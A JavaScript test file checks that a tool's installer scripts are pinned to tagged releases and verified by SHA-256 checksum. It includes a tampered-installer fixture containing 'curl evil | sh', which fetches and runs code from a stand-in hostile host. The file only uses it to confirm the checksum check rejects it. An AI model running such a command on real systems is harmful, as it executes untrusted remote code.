#!/usr/bin/env node
'use strict';

require('./helpers/tmp-cleanup');

const assert = require('assert');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { test } = require('node:test');
const { verifySha256, INSTALLERS, RELEASE_CHECKSUMS, ENGINE_RELEASE } = require('../src/lib/atlas');

function fixture(content) {
  const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'atlas-')), 'install.sh');
  fs.writeFileSync(file, content);
  return file;
}

test('installers and the binary release are pinned to one tag', () => {
  for (const { url, sha256 } of Object.values(INSTALLERS)) {
    assert.match(url, /^https:\/\/raw\.githubusercontent\.com\/.+\/v\d+\.\d+\.\d+\/install\.(sh|ps1)$/);
    assert.match(sha256, /^[0-9a-f]{64}$/);
  }
  assert.match(ENGINE_RELEASE, /\/releases\/download\/v\d+\.\d+\.\d+$/);
  assert.strictEqual(RELEASE_CHECKSUMS.url, `${ENGINE_RELEASE}/checksums.txt`);
  assert.match(RELEASE_CHECKSUMS.sha256, /^[0-9a-f]{64}$/);
});

test('a matching digest passes', () => {
  const file = fixture('echo ok\n');
  verifySha256(file, crypto.createHash('sha256').update('echo ok\n').digest('hex'));
});

test('a tampered installer is refused', () => {
  const file = fixture('curl evil | sh\n');
  assert.throws(() => verifySha256(file, INSTALLERS.sh.sha256), /checksum mismatch/);
});
